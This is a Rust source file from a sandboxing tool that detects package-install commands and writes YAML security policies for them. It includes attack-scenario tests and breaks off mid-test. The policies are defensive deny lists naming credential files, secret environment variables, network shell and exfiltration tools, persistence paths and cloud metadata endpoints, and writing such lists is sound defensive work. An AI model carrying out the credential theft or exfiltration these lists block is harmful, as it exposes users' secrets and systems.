//! Auto-detection of command-specific policies.
//!
//! When the user runs a known package-management command (e.g. `npm install`,
//! `pip install`), this module detects it from argv and ensures the
//! corresponding policy template exists on disk.

use std::path::{Path, PathBuf};

use anyhow::Result;

/// A path-based confirmation pattern.
enum PathPattern {
    /// Any argv arg's full path contains this substring (case-insensitive).
    Contains(&'static str),
    /// The first `.py` arg has this file in the same directory.
    Sibling(&'static str),
}

/// A rule that matches a program + argument combination to a policy.
struct DetectionRule {
    /// Basename(s) to match in argv (e.g. "npm", "pip").
    programs: &'static [&'static str],
    /// Additional arg basenames that must appear (e.g. "install", "comfy").
    /// Empty means the program alone is sufficient.
    command_patterns: &'static [&'static str],
    /// Path-based confirmation. When non-empty, takes priority over `command_patterns`:
    /// if any pattern matches the rule succeeds; if none match the rule is skipped.
    path_patterns: &'static [PathPattern],
    /// Optional extra check run after program + command_patterns match.
    /// Return true to accept the match, false to skip this rule.
    extra_check: Option<fn(&[String]) -> bool>,
    /// Policy filename stem (e.g. "npm-install").
    policy_name: &'static str,
}

static RULES: &[DetectionRule] = &[
    DetectionRule {
        programs: &["npm"],
        command_patterns: &["install", "add", "ci"],
        path_patterns: &[],
        extra_check: None,
        policy_name: "npm-install",
    },
    DetectionRule {
        programs: &["pip", "pip3"],
        command_patterns: &["install"],
        path_patterns: &[],
        extra_check: None,
        policy_name: "pip-install",
    },
    // ComfyUI via python — confirmed by path keyword or sibling file
    DetectionRule {
        programs: &["python", "python3"],
        command_patterns: &[],
        path_patterns: &[
            PathPattern::Contains("comfyui"),
            PathPattern::Sibling("comfyui_version.py"),
        ],
        extra_check: None,
        policy_name: "comfyui",
    },
    // ComfyUI via `python -m comfy`
    DetectionRule {
        programs: &["python", "python3"],
        command_patterns: &["comfy"],
        path_patterns: &[],
        extra_check: None,
        policy_name: "comfyui",
    },
    // ComfyUI standalone binary
    DetectionRule {
        programs: &["comfyui"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: None,
        policy_name: "comfyui",
    },
    // openclaw — direct binary invocation
    DetectionRule {
        programs: &["openclaw"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: None,
        policy_name: "openclaw",
    },
    // openclaw via node — confirmed by path keyword
    DetectionRule {
        programs: &["node"],
        command_patterns: &[],
        path_patterns: &[PathPattern::Contains("openclaw")],
        extra_check: None,
        policy_name: "openclaw",
    },
    // openclaw.mjs — direct script invocation
    DetectionRule {
        programs: &["openclaw.mjs"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: None,
        policy_name: "openclaw",
    },
    // bash/sh — install scripts only (not interactive shells).
    // Matches: bash -c "...", bash script.sh, piped stdin.
    // Does NOT match bare `bash` or `bash -i` (interactive REPL).
    // Placed last so more specific rules (npm, pip, comfyui) match first.
    DetectionRule {
        programs: &["bash", "sh"],
        command_patterns: &[],
        path_patterns: &[],
        extra_check: Some(is_bash_non_interactive),
        policy_name: "bash-install",
    },
];

/// Scan the full argv and return the first matching policy name, or None.
pub(crate) fn detect_policy(program: &[String]) -> Option<&'static str> {
    // Compute basenames once.
    let basenames: Vec<&str> = program
        .iter()
        .map(|arg| {
            Path::new(arg)
                .file_name()
                .and_then(|f| f.to_str())
                .unwrap_or(arg)
        })
        .collect();

    for rule in RULES {
        let has_program = basenames
            .iter()
            .any(|b| rule.programs.iter().any(|p| *b == *p));
        if !has_program {
            continue;
        }

        // Path patterns take priority: if specified, they alone decide the match.
        if !rule.path_patterns.is_empty() {
            if check_path_patterns(program, rule.path_patterns) {
                return Some(rule.policy_name);
            }
            continue;
        }

        // Otherwise match on arg basenames.
        let has_args = rule.command_patterns.is_empty()
            || basenames
                .iter()
                .any(|b| rule.command_patterns.iter().any(|s| *b == *s));
        if !has_args {
            continue;
        }

        // Run extra check if specified.
        if let Some(check) = rule.extra_check {
            if !check(program) {
                continue;
            }
        }

        return Some(rule.policy_name);
    }
    None
}

/// Check whether bash/sh is being run non-interactively (i.e. running a script).
/// Returns true for: `bash -c "..."`, `bash script.sh`.
/// Returns false for: bare `bash`, `bash -i`, `bash --norc` (interactive REPL).
fn is_bash_non_interactive(argv: &[String]) -> bool {
    // Skip argv[0] (the bash binary itself).
    let args = if argv.len() > 1 { &argv[1..] } else { &[] };

    // Has `-c` flag → inline script
    if args.iter().any(|a| a == "-c") {
        return true;
    }

    // Has a non-flag argument → script file
    for arg in args {
        if arg == "--" {
            // `--` ends options; anything after is a script name
            return true;
        }
        if !arg.starts_with('-') {
            return true;
        }
    }

    false
}

/// Ensure the auto-policy YAML file exists on disk and return its path.
///
/// On first detection the embedded template is written to
/// `~/.config/malwi/policies/<name>.yaml`. Subsequent runs reuse the
/// file (the user may have customised it).
pub(crate) fn ensure_auto_policy(name: &str) -> Result<PathBuf> {
    let dir = crate::config::policies_dir()?;
    let path = dir.join(format!("{}.yaml", name));

    if !path.exists() {
        let yaml = embedded_policy(name)
            .ok_or_else(|| anyhow::anyhow!("No embedded policy template for '{}'", name))?;
        std::fs::write(&path, &yaml)?;
    }

    Ok(path)
}

/// Check whether any path pattern matches against argv.
fn check_path_patterns(argv: &[String], patterns: &[PathPattern]) -> bool {
    patterns.iter().any(|p| p.matches(argv))
}

impl PathPattern {
    fn matches(&self, argv: &[String]) -> bool {
        match self {
            PathPattern::Contains(keyword) => {
                argv.iter().any(|arg| arg.to_ascii_lowercase().contains(keyword))
            }
            PathPattern::Sibling(filename) => argv.iter().any(|arg| {
                let dir = Path::new(arg).parent().unwrap_or(Path::new("."));
                let dir = if dir.as_os_str().is_empty() { Path::new(".") } else { dir };
                dir.join(filename).exists()
            }),
        }
    }
}

/// Return the embedded YAML template for a given policy name.
pub fn embedded_policy(name: &str) -> Option<String> {
    match name {
        "npm-install" => Some(build_policy(
            NPM_INSTALL_SPECIFIC,
            &[BASE_FILES, BASE_ENVVARS, BASE_SYMBOLS],
        )),
        "pip-install" => Some(build_policy(
            PIP_INSTALL_SPECIFIC,
            &[BASE_FILES, BASE_ENVVARS, BASE_SYMBOLS],
        )),
        "comfyui" => Some(build_policy(
            COMFYUI_SPECIFIC,
            &[BASE_SYMBOLS],
        )),
        "openclaw" => Some(build_policy(
            OPENCLAW_SPECIFIC,
            &[BASE_SYMBOLS],
        )),
        "bash-install" => Some(build_policy(
            BASH_INSTALL_SPECIFIC,
            &[BASE_SYMBOLS, BASE_NETWORK],
        )),
        "air-gap" => Some(build_policy(
            AIR_GAP_SPECIFIC,
            &[BASE_FILES, BASE_ENVVARS],
        )),
        "base" => Some(build_policy(
            BASE_HEADER,
            &[BASE_FILES, BASE_ENVVARS, BASE_SYMBOLS, BASE_NETWORK],
        )),
        _ => None,
    }
}

/// Concatenate a policy-specific section with shared base sections.
fn build_policy(specific: &str, base_sections: &[&str]) -> String {
    let mut out = String::with_capacity(2048);
    out.push_str(specific);
    for section in base_sections {
        out.push('\n');
        out.push_str(section);
    }
    out
}

// ---------------------------------------------------------------------------
// Shared base security sections — included in every policy.
// ---------------------------------------------------------------------------

const BASE_FILES: &str = "\
# Protect sensitive files from exfiltration.
files:
  deny:
    - \"~/.ssh/**\"
    - \"*/.ssh/**\"
    - \"~/.aws/**\"
    - \"*/.aws/**\"
    - \"~/.config/gcloud/**\"
    - \"~/.azure/**\"
    - \"~/.gnupg/**\"
    - \"~/.config/gh/**\"
    - \"*/.kube/config\"
    - \"*.pem\"
    - \"*.key\"
    - \"*id_rsa*\"
    - \"*id_ed25519*\"
";

const BASE_ENVVARS: &str = "\
# Protect sensitive environment variables.
envvars:
  deny:
    - \"*SECRET*\"
    - \"*TOKEN*\"
    - \"*PASSWORD*\"
    - \"*API_KEY*\"
    - \"*PRIVATE_KEY*\"
    - \"AWS_*\"
    - \"GITHUB_*\"
    - \"GCP_*\"
    - \"AZURE_*\"
    - \"OPENAI_*\"
    - \"ANTHROPIC_*\"
    - HF_TOKEN
    - DYLD_INSERT_LIBRARIES
    - LD_PRELOAD
";

const BASE_SYMBOLS: &str = "\
# Block credential-interception native functions.
symbols:
  deny:
    - getpass
    - crypt
";

const BASE_NETWORK: &str = "\
# Block cloud metadata endpoints (SSRF protection).
# Warn on suspicious TLDs and anonymity networks.
network:
  deny:
    - \"169.254.169.254/**\"
    - \"metadata.google.internal/**\"
  warn:
    - \"*.onion\"
    - \"*.i2p\"
    - \"*.bit\"
    - \"*.loki\"
";

// ---------------------------------------------------------------------------
// Embedded policy templates — policy-specific sections only.
// Base sections are appended by build_policy().
// ---------------------------------------------------------------------------

const BASE_HEADER: &str = "\
version: 1

# Base security sections — shared across all malwi policies.
# This file is a reference only; it is not loaded at runtime.
# Each policy file contains these sections inline.
# Reset with: malwi p base
";

const NPM_INSTALL_SPECIFIC: &str = "\
version: 1

# Auto-policy for npm install / add / ci
# Customise: ~/.config/malwi/policies/npm-install.yaml

nodejs:
  allow:
    - dns.lookup
    - dns.resolve
    - net.connect
    - tls.connect
    - fetch
    - \"http.request\"
    - \"https.request\"
    - \"http.get\"
    - \"https.get\"
  deny:
    - eval
    - vm.runInContext
    - vm.runInNewContext

commands:
  allow:
    - node
    - sh
    - bash
    - git
  deny:
    - curl
    - wget
    - ssh
    - nc
    - ncat
    - \"*sudo*\"
    - \"python*\"
    - perl
    - ruby

network:
  allow:
    - \"registry.npmjs.org/**\"
    - \"*.npmjs.org/**\"
  deny:
    - \"169.254.169.254/**\"
    - \"metadata.google.internal/**\"
  warn:
    - \"*.onion\"
    - \"*.i2p\"
    - \"*.bit\"
    - \"*.loki\"
";

const PIP_INSTALL_SPECIFIC: &str = "\
version: 1

# Auto-policy for pip install
# Customise: ~/.config/malwi/policies/pip-install.yaml
#
# pip uses subprocess/exec/compile internally — cannot deny those.
# Security: HTTP URL whitelist + command restrictions.

# Trace networking calls — required for http: URL rules to fire.
python:
  allow:
    - socket.create_connection
    - socket.socket.connect
    - ssl.SSLSocket.connect
    - urllib.request.urlopen
    - \"http.client.HTTPConnection.request\"
    - \"http.client.HTTPSConnection.request\"

commands:
  allow:
    - git
  deny:
    - curl
    - wget
    - ssh
    - nc
    - ncat
    - \"*sudo*\"
    - sh
    - bash
    - perl
    - ruby

network:
  allow:
    - \"pypi.org/**\"
    - \"*.pypi.org/**\"
    - \"files.pythonhosted.org/**\"
    - \"*.pythonhosted.org/**\"
  deny:
    - \"169.254.169.254/**\"
    - \"metadata.google.internal/**\"
  warn:
    - \"*.onion\"
    - \"*.i2p\"
    - \"*.bit\"
    - \"*.loki\"
";

const COMFYUI_SPECIFIC: &str = "\
version: 1

# Auto-policy for ComfyUI (AI image generation)
# Customise: ~/.config/malwi/policies/comfyui.yaml
#
# Threat model: malicious custom node running arbitrary Python via importlib.
# exec/compile/eval cannot be denied — Python's import system uses them.

python:
  deny:
    # shell command execution
    - os.system
    - os.popen
    # credential theft
    - getpass.getpass
    - keyring.get_password
    - keyring.set_password
    # native code escape hatch — blocks loading libc/C libraries
    # to prevent raw socket exfiltration that bypasses network rules
    - ctypes.CDLL
    - ctypes.cdll.LoadLibrary
    - ctypes.WinDLL
    # exfiltration via allowed HTTP hosts — argument-constrained denies
    - \"requests.post\": [\"*api.github.com*\"]
    - \"requests.put\": [\"*api.github.com*\"]
    - \"requests.post\": [\"*upload.pypi.org*\"]
    - \"httpx.post\": [\"*api.github.com*\"]
    - \"aiohttp.ClientSession._request\": [\"*api.github.com*\"]
  warn:
    # subprocess use — not blocked (ComfyUI uses it for GPU detection),
    # but worth noticing if a custom node spawns processes
    - subprocess.run
    - subprocess.call
    - subprocess.check_output
    - subprocess.check_call
    - subprocess.Popen.__init__

# Read-only git + package management. Block write operations and dangerous tools.
commands:
  allow:
    # custom node repos — read-only
    - \"git clone *\"
    - \"git pull *\"
    - \"git fetch *\"
    - \"git checkout *\"
    - \"git submodule *\"
    - \"git status\"
    - \"git rev-parse *\"
    - \"git log *\"
    - \"git diff *\"
    # custom node dependencies
    - \"pip install *\"
    - \"pip3 install *\"
    - \"python -m pip *\"
    - \"python3 -m pip *\"
  deny:
    # git write operations — exfiltration channel
    - \"git push *\"
    - \"git remote add *\"
    - \"git remote set-url *\"
    # data exfiltration tools
    - curl
    - wget
    # remote access
    - ssh
    - nc
    - ncat
    # privilege escalation
    - \"*sudo*\"
    # shell spawning
    - sh
    - bash
    - perl
    - ruby

# Restrict outbound HTTP to known model hosting and package registries.
network:
  allow:
    # model downloads
    - \"huggingface.co/**\"
    - \"*.huggingface.co/**\"
    - \"civitai.com/**\"
    - \"*.civitai.com/**\"
    # custom nodes and raw content (NOT *.github.com — blocks api.github.com)
    - \"github.com/**\"
    - \"*.githubusercontent.com/**\"
    # pip packages — download only (not upload.pypi.org)
    - \"pypi.org/simple/**\"
    - \"*.pypi.org/simple/**\"
    - \"files.pythonhosted.org/**\"
    - \"*.pythonhosted.org/**\"
    # ComfyUI web UI (any port — kept broad for compatibility)
    - \"127.0.0.1:*/**\"
    - \"localhost:*/**\"
  deny:
    - \"169.254.169.254/**\"
    - \"metadata.google.internal/**\"
  warn:
    - \"*.onion\"
    - \"*.i2p\"
    - \"*.bit\"
    - \"*.loki\"
  protocols: [https, http, wss, ws]

# Protect sensitive files from exfiltration.
files:
  deny:
    - \"~/.ssh/**\"
    - \"*/.ssh/**\"
    - \"~/.aws/**\"
    - \"*/.aws/**\"
    - \"~/.config/gcloud/**\"
    - \"~/.azure/**\"
    - \"~/.gnupg/**\"
    - \"~/.config/gh/**\"
    - \"*/.kube/config\"
    - \"*.pem\"
    - \"*.key\"
    - \"*id_rsa*\"
    - \"*id_ed25519*\"

# Protect sensitive environment variables.
envvars:
  deny:
    - \"*SECRET*\"
    - \"*TOKEN*\"
    - \"*PASSWORD*\"
    - \"*API_KEY*\"
    - \"*PRIVATE_KEY*\"
    - \"AWS_*\"
    - \"GITHUB_*\"
    - \"GCP_*\"
    - \"AZURE_*\"
    - \"OPENAI_*\"
    - \"ANTHROPIC_*\"
    - HF_TOKEN
    - DYLD_INSERT_LIBRARIES
    - LD_PRELOAD
";

const OPENCLAW_SPECIFIC: &str = "\
version: 1

# Auto-policy for openclaw (multi-channel AI gateway)
# Customise: ~/.config/malwi/policies/openclaw.yaml

nodejs:
  allow:
    - dns.lookup
    - dns.resolve
    - net.connect
    - net.createServer
    - tls.connect
    - fetch
    - \"http.request\"
    - \"https.request\"
    - \"http.get\"
    - \"https.get\"
    - \"http.createServer\"
    - \"https.createServer\"
  deny:
    - eval
    - vm.runInContext
    - vm.runInNewContext
    - vm.compileFunction
    - \"child_process.exec\"
    - \"child_process.execSync\"

commands:
  allow:
    # Core runtime
    - node
    - git
    - npm
    - npx
    - pnpm
    - corepack
    # Service management (daemon install/restart)
    - launchctl
    - systemctl
    - schtasks
    # Sandbox containers
    - docker
    # SSH tunnels (remote gateway connections)
    - ssh
    # TLS certificate generation
    - openssl
    # Audio/voice message processing (Discord)
    - ffmpeg
    - ffprobe
    # macOS system info + keychain
    - security
    - sw_vers
    - sysctl
    - scutil
    - defaults
    - lsof
    # Package management
    - brew
    # Google Cloud CLI (Gmail integration)
    - gcloud
    # Windows process control
    - taskkill
  deny:
    # Network tools openclaw never uses (it uses Node.js HTTP)
    - curl
    - wget
    - nc
    - ncat
    - netcat
    - socat
    - telnet
    - scp
    # Interpreters openclaw never spawns
    - \"python*\"
    - perl
    - ruby
    # Obfuscation / exfiltration
    - base64
    - xxd
    - pbcopy
    - xclip
    # Persistence mechanisms
    - crontab
  warn:
    # openclaw uses PTY shells and shell-env; warn for visibility
    - sh
    - bash
  review:
    # openclaw uses sudo for DNS/coredns setup; prompt user
    - sudo
    - su
    - doas

network:
  allow:
    - \"openclaw.ai/**\"
    - \"*.openclaw.ai/**\"
    - \"registry.npmjs.org/**\"
    - \"*.npmjs.org/**\"
    - \"github.com/**\"
    - \"*.githubusercontent.com/**\"
    - \"api.anthropic.com/**\"
    - \"api.openai.com/**\"
    - \"slack.com/**\"
    - \"*.slack.com/**\"
    - \"api.telegram.org/**\"
    - \"discord.com/**\"
    - \"*.discord.com/**\"
    - \"gateway.discord.gg/**\"
    - \"graph.facebook.com/**\"
    - \"127.0.0.1:*/**\"
    - \"localhost:*/**\"
  deny:
    - \"169.254.169.254/**\"
    - \"metadata.google.internal/**\"
  warn: [\"*.onion\", \"*.i2p\", \"*.bit\", \"*.loki\"]
  protocols: [https, http, wss, ws]

files:
  deny:
    - \"~/.ssh/**\"
    - \"*/.ssh/**\"
    - \"~/.aws/**\"
    - \"*/.aws/**\"
    - \"~/.config/gcloud/**\"
    - \"~/.azure/**\"
    - \"~/.gnupg/**\"
    - \"~/.config/gh/**\"
    - \"*/.kube/config\"
    - \"*.pem\"
    - \"*.key\"
    - \"*id_rsa*\"
    - \"*id_ed25519*\"

envvars:
  deny:
    - \"*SECRET*\"
    - \"*PASSWORD*\"
    - \"*PRIVATE_KEY*\"
    - \"AWS_*\"
    - \"GITHUB_*\"
    - \"GCP_*\"
    - \"AZURE_*\"
    - DYLD_INSERT_LIBRARIES
    - LD_PRELOAD
  warn:
    - \"*TOKEN*\"
    - \"*API_KEY*\"
    - \"OPENAI_*\"
    - \"ANTHROPIC_*\"
    - \"CLAUDE_*\"
    - \"OPENCLAW_*\"
    - HF_TOKEN
";

const BASH_INSTALL_SPECIFIC: &str = "\
version: 1

# Auto-policy for bash/sh install scripts (curl ... | bash)
# Customise: ~/.config/malwi/policies/bash-install.yaml
#
# Threat model: malicious install scripts that exfiltrate credentials,
# install persistence, or escalate privileges.
# See SCRIPT_INSTALL.md for the full threat analysis.
#
# Key difference from the default policy: curl/wget are ALLOWED because
# install scripts legitimately download files. Protection is provided by
# file/envvar/network restrictions and blocking dangerous tools.

# Allow download tools and common install utilities.
# Deny interpreters, persistence, privilege escalation, obfuscation,
# raw networking, clipboard access, DNS exfiltration, and remote access tools.
commands:
  allow:
    # Download tools (install scripts need these)
    - curl
    - wget
    # Package managers
    - apt
    - apt-get
    - yum
    - dnf
    - brew
    - pacman
    - apk
    - zypper
    - dpkg
    - rpm
    - snap
    - flatpak
    - pip
    - pip3
    - npm
    - gem
    # Build tools
    - make
    - cmake
    - gcc
    - g++
    - cc
    - cargo
    - rustup
    - go
    # File and text utilities
    - tar
    - unzip
    - gzip
    - gunzip
    - bzip2
    - xz
    - cp
    - mv
    - rm
    - mkdir
    - ln
    - install
    - cat
    - tee
    - sed
    - awk
    - grep
    - cut
    - sort
    - head
    - tail
    - wc
    - tr
    - find
    - dirname
    - basename
    - mktemp
    - realpath
    - readlink
    # Checksum and verification
    - sha256sum
    - sha1sum
    - md5sum
    - shasum
    - gpg
    - gpgv
    # System info
    - uname
    - arch
    - id
    - whoami
    - hostname
    - getconf
    - sw_vers
    - lsb_release
    - dpkg-architecture
    # Process control
    - \"true\"
    - \"false\"
    - test
    - \"[\"
    - sleep
    - env
    - printenv
    - which
    - command
    - type
    # Version managers and tools
    - git
    - nvm
    - rbenv
    - pyenv
    - asdf
    - volta
    - \"python -m venv *\"
    - \"python3 -m venv *\"
    # Shell utilities
    - chmod
    - chown
    - chgrp
    - touch
    - date
    - echo
    - printf
    - tput
    - stty
  deny:
    # Interpreters — prevent proxy attacks (S4.2)
    - \"python*\"
    - perl
    - ruby
    - node
    # Raw networking — prevent unmonitored connections (S5.3)
    - nc
    - ncat
    - netcat
    - socat
    - telnet
    # DNS exfiltration tools (S5.2)
    - dig
    - nslookup
    - host
    # Persistence mechanisms (S3.2, S8.1)
    - crontab
    - at
    - launchctl
    - systemctl
    # Obfuscation tools (S4.1)
    - base64
    - xxd
    - rev
    # Clipboard exfiltration (S5.3)
    - pbcopy
    - pbpaste
    - xclip
    - xsel
    # Remote access
    - ssh
    - scp
    - sftp
    # macOS keychain access (S2.3)
    - security

  warn:
    # eval and dd are common but dangerous
    - eval
    - dd
  review:
    # Privilege escalation (S6.1) — review instead of block because
    # legitimate installers (e.g. Homebrew) need sudo for system-level setup.
    - sudo
    - su
    - doas

# Protect credentials, shell profiles, persistence dirs, and system files.
files:
  deny:
    # Credentials (S2.1)
    - \"~/.ssh/**\"
    - \"*/.ssh/**\"
    - \"~/.aws/**\"
    - \"*/.aws/**\"
    - \"~/.config/gcloud/**\"
    - \"~/.azure/**\"
    - \"~/.gnupg/**\"
    - \"~/.config/gh/**\"
    - \"*/.kube/config\"
    - \"*.pem\"
    - \"*.key\"
    - \"*id_rsa*\"
    - \"*id_ed25519*\"
    # Shell profiles (S3.1)
    - \"~/.bashrc\"
    - \"~/.bash_profile\"
    - \"~/.zshrc\"
    - \"~/.zprofile\"
    - \"~/.profile\"
    - \"~/.login\"
    # Persistence directories (S3.2)
    - \"~/Library/LaunchAgents/*\"
    - \"~/Library/LaunchDaemons/*\"
    - \"/etc/cron*\"
    - \"/etc/systemd/**\"
    # Git hooks (S3.3)
    - \".git/hooks/*\"
    - \"*/.git/hooks/*\"
    # System files
    - \"/etc/passwd\"
    - \"/etc/shadow\"
    # Browser data (S2.1)
    - \"*/Google/Chrome/**\"
    - \"*/Firefox/**\"
    - \"*/Safari/**\"
    # Shared memory (S5.3)
    - \"/dev/shm/*\"

# Protect sensitive environment variables from exfiltration.
envvars:
  deny:
    # Secret patterns (S2.2)
    - \"*SECRET*\"
    - \"*TOKEN*\"
    - \"*PASSWORD*\"
    - \"*API_KEY*\"
    - \"*PRIVATE_KEY*\"
    # Cloud provider prefixes
    - \"AWS_*\"
    - \"GITHUB_*\"
    - \"GCP_*\"
    - \"AZURE_*\"
    - \"OPENAI_*\"
    - \"ANTHROPIC_*\"
    - HF_TOKEN
    # Anti-tracing (S8.2)
    - DYLD_INSERT_LIBRARIES
    - LD_PRELOAD
";

const AIR_GAP_SPECIFIC: &str = "\
version: 1

# Air-gap policy — total network isolation.
# No outbound connections of any kind.
# Use: malwi x --policy air-gap -- <command>
# Customise: ~/.config/malwi/policies/air-gap.yaml

# Block ALL network access.
network:
  deny:
    - \"*\"        # all domains
    - \"*/**\"     # all URLs
    - \"*:*\"      # all endpoints

# Block network-capable commands, privilege escalation, and network config.
commands:
  deny:
    # HTTP/download tools
    - curl
    - wget
    - aria2c
    # Remote access / file transfer
    - ssh
    - scp
    - sftp
    - ftp
    - rsync
    # Raw networking
    - nc
    - ncat
    - netcat
    - socat
    - telnet
    - openssl
    # Network reconnaissance
    - nmap
    - ping
    - ping6
    - traceroute
    - tracepath
    # DNS tools
    - dig
    - nslookup
    - host
    # Privilege escalation (can change network config)
    - sudo
    - su
    - doas
    # Network configuration
    - ip
    - ifconfig
    - iptables
    - nft
    - route

# Block ALL networking at the C level — catches Python socket.connect(),
# Node.js net.connect(), and Bash /dev/tcp regardless of runtime.
symbols:
  deny:
    # Socket creation
    - socket
    # Outbound connections
    - connect
    # Data sending (covers UDP without connect, inherited FDs)
    - sendto
    - send
    # Server binding/listening
    - bind
    - listen
    - accept
    - accept4
    # DNS resolution
    - getaddrinfo
    - gethostbyname
    - gethostbyname2
    # Raw syscall wrapper (blocks syscall(SYS_socket, ...) style bypass)
    - syscall
    # Credential interception (from base policy)
    - getpass
    - crypt

# Block direct syscalls (inline asm / shellcode bypassing libc).
# Enables the syscall monitor to detect SVC/SYSCALL instructions in user code.
syscalls:
  deny:
    # Socket creation & connections
    - socket
    - connect
    - bind
    - listen
    - accept
    # Data transfer
    - sendto
    - recvfrom
    - sendmsg
    - recvmsg
    # Process creation
    - execve
    - fork
    - vfork
    - clone
    # File access
    - open
    - openat
";

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_npm_install() {
        assert_eq!(
            detect_policy(&strs(&["npm", "install", "react"])),
            Some("npm-install"),
        );
    }

    #[test]
    fn test_detect_npm_add() {
        assert_eq!(
            detect_policy(&strs(&["npm", "add", "lodash"])),
            Some("npm-install"),
        );
    }

    #[test]
    fn test_detect_npm_ci() {
        assert_eq!(
            detect_policy(&strs(&["npm", "ci"])),
            Some("npm-install"),
        );
    }

    #[test]
    fn test_detect_pip_install() {
        assert_eq!(
            detect_policy(&strs(&["pip", "install", "flask"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_pip3_install() {
        assert_eq!(
            detect_policy(&strs(&["/usr/bin/pip3", "install", "flask"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_python_m_pip_install() {
        assert_eq!(
            detect_policy(&strs(&["python3", "-m", "pip", "install", "six"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_no_match() {
        assert_eq!(detect_policy(&strs(&["node", "server.js"])), None);
    }

    #[test]
    fn test_detect_npm_run_no_match() {
        // `npm run build` should NOT match npm-install
        assert_eq!(detect_policy(&strs(&["npm", "run", "build"])), None);
    }

    #[test]
    fn test_detect_pip_without_subcommand() {
        assert_eq!(detect_policy(&strs(&["pip", "freeze"])), None);
    }

    #[test]
    fn test_detect_empty_argv() {
        assert_eq!(detect_policy(&strs(&[])), None);
    }

    #[test]
    fn test_detect_comfyui_python_main_py() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("main.py"), "").unwrap();
        std::fs::write(dir.path().join("comfyui_version.py"), "").unwrap();
        let main_py = dir.path().join("main.py").to_str().unwrap().to_string();
        assert_eq!(
            detect_policy(&[String::from("python"), main_py]),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_detect_python_main_no_siblings() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("main.py"), "").unwrap();
        // No comfyui_version.py → should NOT match.
        let main_py = dir.path().join("main.py").to_str().unwrap().to_string();
        assert_eq!(detect_policy(&[String::from("python"), main_py]), None);
    }

    #[test]
    fn test_detect_comfyui_python_m_comfy() {
        assert_eq!(
            detect_policy(&strs(&["python3", "-m", "comfy", "--port", "8188"])),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_detect_comfyui_standalone() {
        assert_eq!(
            detect_policy(&strs(&["comfyui", "--listen"])),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_pip_install_comfyui_matches_pip() {
        // `pip install comfyui` should match pip-install (not comfyui).
        assert_eq!(
            detect_policy(&strs(&["pip", "install", "comfyui"])),
            Some("pip-install"),
        );
    }

    #[test]
    fn test_detect_comfyui_path_keyword() {
        // "comfyui" in the path is sufficient — no sibling files needed.
        assert_eq!(
            detect_policy(&[
                String::from("python"),
                String::from("/tmp/ComfyUI/main.py"),
            ]),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_detect_comfyui_path_keyword_case_insensitive() {
        // Case-insensitive: "comfyui" in a lowered path component still matches.
        assert_eq!(
            detect_policy(&[
                String::from("python"),
                String::from("/home/user/comfyui/run.py"),
            ]),
            Some("comfyui"),
        );
    }

    #[test]
    fn test_detect_no_false_positive_path() {
        // "python /tmp/other/main.py" should NOT match (no keyword, no sibling).
        assert_eq!(
            detect_policy(&[
                String::from("python"),
                String::from("/tmp/other/main.py"),
            ]),
            None,
        );
    }

    /// Helper to convert &[&str] to Vec<String>.
    fn strs(s: &[&str]) -> Vec<String> {
        s.iter().map(|x| x.to_string()).collect()
    }

    // =====================================================================
    // ComfyUI auto-policy: attack scenario tests
    // =====================================================================

    use malwi_policy::{EnforcementMode, Operation, Runtime, PolicyAction, PolicyEngine};

    fn comfyui_engine() -> PolicyEngine {
        let yaml = embedded_policy("comfyui").expect("comfyui policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("comfyui policy must parse")
    }

    #[test]
    fn test_comfyui_policy_parses() {
        let engine = comfyui_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_comfyui_python_block_and_warn_coexist() {
        let engine = comfyui_engine();

        // os.system → Block (from python:)
        let d = engine.evaluate_function(Runtime::Python, "os.system", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        // subprocess.run → Warn (from warn: key)
        let d = engine.evaluate_function(Runtime::Python, "subprocess.run", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        // Unlisted function → allowed
        let d = engine.evaluate_function(Runtime::Python, "json.loads", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_e_ctypes_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "ctypes.CDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.cdll.LoadLibrary", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.WinDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_attack_c_github_api_exfil() {
        let engine = comfyui_engine();

        // api.github.com should NOT be allowed (removed *.github.com)
        let d = engine.evaluate_http_url(
            "https://api.github.com/gists",
            "api.github.com/gists",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        // github.com itself allowed (for cloning)
        let d = engine.evaluate_http_url(
            "https://github.com/comfyanonymous/ComfyUI/archive/main.zip",
            "github.com/comfyanonymous/ComfyUI/archive/main.zip",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_c_pypi_upload() {
        let engine = comfyui_engine();

        // upload.pypi.org should be blocked
        let d = engine.evaluate_http_url(
            "https://upload.pypi.org/legacy/",
            "upload.pypi.org/legacy/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        // pypi.org/simple/ should be allowed
        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_h_git_push_blocked() {
        let engine = comfyui_engine();

        // git push should be blocked
